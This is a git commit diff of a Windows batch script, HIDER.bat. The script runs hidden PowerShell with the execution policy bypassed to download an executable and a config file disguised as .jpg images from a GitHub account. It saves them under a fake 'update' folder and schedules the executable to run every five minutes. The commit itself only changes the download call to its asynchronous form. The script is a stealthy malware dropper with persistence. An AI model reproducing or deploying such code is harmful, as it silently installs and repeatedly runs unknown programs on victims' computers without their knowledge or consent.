7f46e8b4c1ea8519d4150cac3998c00d014a62cd
rodadaajuda <41061724+rodadaajuda@users.noreply.github.com>
2018-07-13 19:03:32 -0300

    Update HIDER.bat

--- HIDER.bat
+++ HIDER.bat
@@ -1,6 +1,6 @@
 @echo off
 mkdir "%LOCALAPPDATA%\update"
-powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rodadaajuda/file/master/update.jpg ',\"$env:LOCALAPPDATA\update\update.exe\")
-powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/rodadaajuda/file/master/config.jpg ',\"$env:LOCALAPPDATA\update\config.json\")
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/rodadaajuda/file/master/update.jpg ',\"$env:LOCALAPPDATA\update\update.exe\")
+powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object System.Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/rodadaajuda/file/master/config.jpg ',\"$env:LOCALAPPDATA\update\config.json\")
 SCHTASKS /Create /SC MINUTE /MO 5 /TN "Update" /TR "%LOCALAPPDATA%\update\update.exe"
 Exit
